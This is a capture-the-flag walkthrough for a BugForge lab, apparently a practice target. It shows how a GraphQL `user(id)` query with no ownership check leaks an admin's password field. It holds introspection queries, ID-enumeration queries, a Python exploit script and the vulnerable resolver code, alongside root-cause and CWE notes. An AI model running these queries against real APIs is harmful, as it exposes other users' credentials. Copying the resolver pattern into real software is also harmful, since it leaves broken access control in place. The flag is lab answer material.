# ottergram-005 - BugForge Lab Walkthrough

**URL:** https://lab-1783430492230-0116jl.labs-app.bugforge.io/
**Difficulty:** Easy
**Vulnerability:** GraphQL IDOR on the `user(id)` query - no ownership or role check on the resolver
**Flag:** `bug{O2pCUfb0vlJToBOOC53glYTWfHT1Vv4w}`

---

## Summary

Ottergram is a social media platform for otter photos. Alongside its REST API, this instance exposes a `/graphql` endpoint. The `user(id)` query resolver returns the full `User` type, including the `password` field, for any ID supplied by the caller, with no check that the caller owns that ID or holds an admin role. Introspection is left enabled, making the schema trivial to enumerate. Querying `user(id: 2)` returns the admin account, whose `password` field contains the flag.

---

## Tech Stack

- React SPA frontend
- Express.js (Node.js)
- GraphQL endpoint at `/graphql`
- JWT (stored in localStorage)
- SQLite

---

## Key Endpoints

| Endpoint | Method | Auth | Notes |
|----------|--------|------|-------|
| `/api/register` | POST | No | Standard registration |
| `/api/login` | POST | No | Returns JWT |
| `/graphql` | POST | JWT | **Vulnerable** - `user(id)` query has no ownership check |

---

## Discovery

### Step 1 - Enumerate the app

Fetching the homepage and its JS bundle shows the usual Ottergram REST routes (`/api/register`, `/api/login`, `/api/posts`, `/api/profile`, `/api/admin/*`), plus a reference to `/graphql` in the bundle that is not called anywhere in the visible React code.

### Step 2 - Register and probe GraphQL

Register a normal user account and grab its JWT:

```
POST /api/register
{"username":"pentest_rp","email":"pentest_rp@example.com","password":"Pentest123!"}
```

The token is a standard `Bearer` JWT with `id` and `username` claims.

### Step 3 - Check introspection

```
POST /graphql
Authorization: Bearer <token>

{ __schema { queryType { fields { name args { name } } } } }
```

Response:

```json
{"data":{"__schema":{"queryType":{"fields":[
  {"name":"analytics","args":[{"name":"userId"}]},
  {"name":"user","args":[{"name":"id"}]}
]}}}}
```

Introspection is fully enabled and there is no mutation type. Two query fields take a raw ID as an argument.

### Step 4 - Introspect the User type

```
{ __type(name: "User") { fields { name type { name } } } }
```

Response:

```json
{"data":{"__type":{"fields":[
  {"name":"id"},{"name":"username"},{"name":"email"},
  {"name":"password"},{"name":"full_name"},{"name":"bio"},{"name":"role"}
]}}}
```

The `User` type exposes `password` and `role` directly.

### Step 5 - Query another user's record

```
POST /graphql
Authorization: Bearer <token>

{ user(id: 2) { id username email password role } }
```

Response:

```json
{"data":{"user":{"id":2,"username":"admin","email":"admin@ottergram.com",
"password":"bug{O2pCUfb0vlJToBOOC53glYTWfHT1Vv4w}","role":"admin"}}}
```

The `user` resolver fetches any row by the caller-supplied ID and returns every field with no ownership or role check. The flag sits in the admin account's `password` field.

Batching multiple IDs in one request via aliases also works and confirms the same lack of per-row authorization across the whole `users` table:

```
{ u1: user(id:1){id username email password role}
  u2: user(id:2){id username email password role}
  u3: user(id:3){id username email password role} }
```

---

## Exploit

```python
import urllib.request, json

TARGET = "https://lab-1783430492230-0116jl.labs-app.bugforge.io"

def post(path, body, tok=None):
    h = {"Content-Type": "application/json"}
    if tok:
        h["Authorization"] = "Bearer " + tok
    req = urllib.request.Request(TARGET + path, data=json.dumps(body).encode(), headers=h)
    return json.loads(urllib.request.urlopen(req).read())

reg = post("/api/register", {"username": "pentest_rp", "email": "pentest_rp@example.com",
                              "password": "Pentest123!"})
token = reg["token"]

query = "{ user(id: 2) { id username email password role } }"
result = post("/graphql", {"query": query}, tok=token)
print(result["data"]["user"]["password"])
# bug{O2pCUfb0vlJToBOOC53glYTWfHT1Vv4w}
```

---

## Dead Ends

None encountered - the GraphQL endpoint had no rate limiting, no mutation surface, and the very first authenticated query against `user(id)` returned the admin record directly.

---

## Root Cause

The GraphQL resolver for `user(id)` fetches a row by the raw ID argument and serializes every field on the `User` type without checking that the requesting JWT's `id` claim matches the requested `id`, or that the requester holds an admin role:

```javascript
// Vulnerable pattern (approximate)
Query: {
  user: async (_, { id }) => {
    return db.get("SELECT * FROM users WHERE id = ?", [id]);
  }
}
```

REST routes in this codebase (`/api/admin/*`) are gated by role middleware, but that middleware is only wired into the Express router, not into the GraphQL resolver layer, so the same protection never applies to `/graphql`.

---

## CWE / OWASP

- **CWE-639**: Authorization Bypass Through User-Controlled Key (Insecure Direct Object Reference)
- **OWASP A01:2021** - Broken Access Control
